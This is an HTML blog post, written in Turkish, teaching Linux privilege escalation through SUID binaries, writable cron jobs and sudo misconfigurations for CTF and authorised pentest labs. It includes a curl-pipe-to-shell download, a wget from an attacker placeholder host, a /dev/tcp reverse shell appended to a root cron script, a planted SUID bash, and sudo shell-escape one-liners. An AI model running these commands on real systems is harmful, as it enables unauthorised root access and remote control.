@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="SUID bit istismarı, zayıf cron job yapılandırmaları ve yanlış sudo izinleri ile Linux'ta root yetkisi elde etme teknikleri.">
+  <title>Linux Privilege Escalation: SUID, Cron Jobs ve Sudo — 0xBlog</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+</head>
+<body>
+
+  <!-- ── HEADER ── -->
+  <header class="site-header">
+    <nav class="nav-inner">
+      <a href="../index.html" class="site-logo">
+        <span class="logo-bracket">[</span>0xBlog<span class="logo-bracket">]</span>
+        <span class="logo-cursor"></span>
+      </a>
+      <button class="nav-toggle" id="navToggle" aria-label="Menüyü aç/kapat">&#9776;</button>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="../index.html">Ana Sayfa</a></li>
+        <li><a href="../index.html#posts">Makaleler</a></li>
+        <li><a href="../index.html#about">Hakkında</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- ── MAIN ── -->
+  <main class="page-wrapper">
+
+    <header class="article-hero">
+      <nav class="article-breadcrumb" aria-label="Breadcrumb">
+        <a href="../index.html">Ana Sayfa</a>
+        <span class="sep">/</span>
+        <a href="../index.html#posts">Makaleler</a>
+        <span class="sep">/</span>
+        <span>Linux PrivEsc</span>
+      </nav>
+
+      <h1>Linux Privilege Escalation:<br>SUID, Cron Jobs ve Sudo Zafiyetleri</h1>
+
+      <div class="article-meta-bar">
+        <span>28 Mart 2026</span>
+        <span class="sep">|</span>
+        <span>Linux Security</span>
+        <span class="sep">|</span>
+        <span>15 dk okuma</span>
+        <span class="sep">|</span>
+        <span style="color:var(--neon-dim)">0xBlog Yazarı</span>
+      </div>
+
+      <div class="article-tags">
+        <span class="tag active">Linux</span>
+        <span class="tag active">Privilege Escalation</span>
+        <span class="tag active">SUID</span>
+        <span class="tag active">CTF</span>
+        <span class="tag active">Pentest</span>
+      </div>
+    </header>
+
+    <article class="article-body">
+
+      <p>
+        Bir sisteme düşük yetkili kullanıcı olarak ayak bastınız. Peki bundan sonra ne yaparsınız?
+        <strong>Privilege Escalation (PrivEsc)</strong>, mevcut düşük yetkili erişimi root veya
+        daha yüksek yetkili bir kullanıcıya yükseltme sürecidir.
+        Bu yazı, gerçek CTF ve pentest senaryolarında en sık karşılaşılan üç vektörü detaylı olarak ele alır.
+      </p>
+
+      <div class="warn-box">
+        <strong>&#9888; Yasal Uyarı:</strong> Bu teknikler yalnızca izin verilmiş ortamlarda (CTF, lab, yetkili pentest) kullanılmalıdır.
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Keşif Aşaması: LinPEAS ile Başla</h2>
+
+      <p>
+        Manuel keşiften önce <strong>LinPEAS</strong> çalıştırarak sistemi otomatik taratmak zaman kazandırır.
+        Renk kodlamasıyla kritik bulguları hemen işaretler.
+      </p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">Bash — LinPEAS</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm"># Hedef makinede internet varsa:</span>
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+<span class="cm"># Yoksa saldırı makinenizden transfer edin:</span>
+<span class="cm"># Saldırı makinesinde:</span>
+python3 -m http.server 8080
+
+<span class="cm"># Hedef makinede:</span>
+wget http://&lt;ATTACKER_IP&gt;:8080/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas_output.txt</code></pre>
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Vektör 1: SUID Bit İstismarı</h2>
+
+      <p>
+        SUID (Set User ID) biti olan bir ikili dosya, dosyayı çalıştıran kullanıcıdan bağımsız olarak
+        <em>dosyanın sahibinin yetkisiyle</em> çalışır. Eğer sahip <strong>root</strong> ise ve dosya
+        tehlikeli işlevler içeriyorsa, bu bir PrivEsc vektörüdür.
+      </p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">Bash — SUID Keşfi</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm"># SUID bitli root'a ait tüm ikilileri listele</span>
+find / -perm -4000 -user root -type f 2>/dev/null
+
+<span class="cm"># Örnek tehlikeli çıktılar:</span>
+<span class="cm"># /usr/bin/find</span>
+<span class="cm"># /usr/bin/vim.basic</span>
+<span class="cm"># /usr/bin/python3.8</span>
+<span class="cm"># /usr/bin/nmap  (eski sürümlerde)</span></code></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">Bash — find SUID İstismarı (GTFOBins)</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm"># /usr/bin/find SUID bitli ise:</span>
+find . -exec /bin/sh -p \; -quit
+<span class="cm"># -p flag'i SUID yetkisini korur → root shell</span>
+
+<span class="cm"># vim SUID bitli ise:</span>
+vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+
+<span class="cm"># python3 SUID bitli ise:</span>
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'</code></pre>
+      </div>
+
+      <div class="info-box">
+        <strong>&#9432; GTFOBins:</strong> SUID, sudo ve diğer PrivEsc tekniklerinin kapsamlı listesi için
+        <a href="https://gtfobins.github.io" target="_blank" rel="noopener">gtfobins.github.io</a> adresine başvurun.
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Vektör 2: Cron Job Zafiyetleri</h2>
+
+      <p>
+        Root'un çalıştırdığı bir cron job, <em>yazılabilir bir script</em>'e veya
+        <em>yazılabilir bir PATH konumundaki ikili dosyaya</em> atıfta bulunuyorsa,
+        bu script'e zararlı komut ekleyerek root yetkisi ele geçirilir.
+      </p>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">Bash — Cron İnceleme</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm"># Sistem geneli crontab'ları incele</span>
+cat /etc/crontab
+cat /etc/cron.d/*
+ls -la /var/spool/cron/crontabs/
+
+<span class="cm"># Örnek zararlı crontab satırı:</span>
+<span class="cm"># * * * * * root /opt/scripts/backup.sh</span>
+
+<span class="cm"># Script'in izinlerini kontrol et:</span>
+ls -la /opt/scripts/backup.sh
+<span class="cm"># -rwxrwxrwx → dünya tarafından yazılabilir = kritik zafiyet</span></code></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">Bash — Cron İstismarı</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm"># Backup script'e reverse shell ekle:</span>
+echo 'bash -i >& /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0>&1' >> /opt/scripts/backup.sh
+
+<span class="cm"># Saldırı makinenizde listener başlatın:</span>
+nc -lvnp 4444
+
+<span class="cm"># Cron her dakika çalışır → 60 saniye içinde root shell gelir</span>
+
+<span class="cm"># Alternatif: SUID bash yerleştirme</span>
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
+<span class="cm"># Cron çalıştıktan sonra:</span>
+/tmp/rootbash -p</code></pre>
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Vektör 3: Sudo Yanlış Yapılandırmaları</h2>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">Bash — Sudo İnceleme</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm"># Mevcut kullanıcının sudo yetkilerini listele</span>
+sudo -l
+
+<span class="cm"># Örnek tehlikeli çıktılar:</span>
+<span class="cm"># (ALL) NOPASSWD: /usr/bin/find</span>
+<span class="cm"># (ALL) NOPASSWD: /usr/bin/vim</span>
+<span class="cm"># (ALL) NOPASSWD: /usr/bin/awk</span>
+<span class="cm"># (ALL) NOPASSWD: ALL   ← en tehlikeli, direkt sudo su</span></code></pre>
+      </div>
+
+      <div class="code-block">
+        <div class="code-block-header">
+          <div class="code-block-dots">
+            <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
+          </div>
+          <span class="code-block-lang">Bash — Sudo İstismar Örnekleri</span>
+          <button class="code-block-copy" onclick="copyCode(this)">Kopyala</button>
+        </div>
+        <pre><code><span class="cm"># ── vim ile shell alma ──</span>
+sudo vim -c ':!/bin/bash'
+
+<span class="cm"># ── awk ile komut çalıştırma ──</span>
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+<span class="cm"># ── less ile shell ──</span>
+sudo less /etc/passwd
+<span class="cm"># less içinde: !/bin/bash</span>
+
+<span class="cm"># ── tar ile komut çalıştırma ──</span>
+sudo tar -cf /dev/null /dev/null --checkpoint=1 \
+  --checkpoint-action=exec=/bin/bash
+
+<span class="cm"># ── env ile ortam değişkeni bypass ──</span>
+sudo env /bin/bash</code></pre>
+      </div>
+
+      <!-- Screenshot -->
+      <div class="screenshot-wrapper">
+        <div class="screenshot-bar">
+          <div class="code-block-dots">
+            <span class="dot-red"></span><span class="dot-yellow"></span><span class="dot-green"></span>
+          </div>
+          <span class="screenshot-url">terminal — sudo -l çıktısı ve shell alma</span>
+        </div>
+        <div class="img-placeholder">
+          <span class="icon">&#128247;</span>
+          <span>assets/privesc-demo.png</span>
+          <small style="opacity:.5;font-size:.7rem">Ekran görüntüsünü buraya yerleştirin</small>
+        </div>
+        <p class="screenshot-caption">
+          sudo -l ile keşfedilen NOPASSWD yetkisi aracılığıyla root shell elde edilen terminal çıktısı.
+        </p>
+      </div>
+
+      <!-- ======================================================= -->
+      <h2>Hızlı Başvuru Tablosu</h2>
+
+      <table>
+        <thead>
+          <tr>
+            <th>Vektör</th>
+            <th>Keşif Komutu</th>
+            <th>Risk Seviyesi</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>SUID Bitleri</td>
+            <td><code>find / -perm -4000 -user root</code></td>
+            <td style="color:var(--accent-red)">Kritik</td>
+          </tr>
+          <tr>
+            <td>Yazılabilir Cron</td>
+            <td><code>cat /etc/crontab</code></td>
+            <td style="color:var(--accent-red)">Kritik</td>
+          </tr>
+          <tr>
+            <td>Sudo Yetkileri</td>
+            <td><code>sudo -l</code></td>
+            <td style="color:var(--accent-yellow)">Yüksek</td>
+          </tr>
+          <tr>
+            <td>Yazılabilir /etc/passwd</td>
+            <td><code>ls -la /etc/passwd</code></td>
+            <td style="color:var(--accent-red)">Kritik</td>
+          </tr>
+          <tr>
+            <td>NFS no_root_squash</td>
+            <td><code>cat /etc/exports</code></td>
+            <td style="color:var(--accent-yellow)">Yüksek</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <!-- ======================================================= -->
+      <h2>Kaynaklar &amp; İleri Okuma</h2>
+      <ul>
+        <li><a href="https://gtfobins.github.io" target="_blank" rel="noopener">GTFOBins — SUID/Sudo Exploit Rehberi</a></li>
+        <li><a href="https://github.com/carlospolop/PEASS-ng" target="_blank" rel="noopener">LinPEAS / PEASS-ng (GitHub)</a></li>
+        <li><a href="https://tryhackme.com/room/linuxprivesc" target="_blank" rel="noopener">TryHackMe — Linux PrivEsc Lab</a></li>
+        <li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" target="_blank" rel="noopener">HackTricks — Linux Privilege Escalation</a></li>
+      </ul>
+
+      <div style="margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem;">
+        <a href="../index.html" class="read-more">&larr; Tüm Makaleler</a>
+        <span style="font-size:.78rem;color:var(--text-muted)">Son güncelleme: 28 Mart 2026</span>
+      </div>
+
+    </article>
+  </main>
+
+  <footer class="site-footer">
+    <span class="footer-symbol">_</span>
+    &copy; <span id="year"></span> 0xBlog &mdash; Tüm içerikler eğitim amaçlıdır.
+  </footer>
+
+  <script>
+    document.getElementById('year').textContent = new Date().getFullYear();
+    document.getElementById('navToggle').addEventListener('click', () => {
+      document.getElementById('navLinks').classList.toggle('open');
+    });
+    function copyCode(btn) {
+      const pre = btn.closest('.code-block').querySelector('pre');
+      navigator.clipboard.writeText(pre.innerText).then(() => {
+        btn.textContent = 'Kopyalandı!';
+        btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = 'Kopyala'; btn.classList.remove('copied'); }, 2000);
+      }).catch(() => {});
+    }
+  </script>
+</body>
+</html>
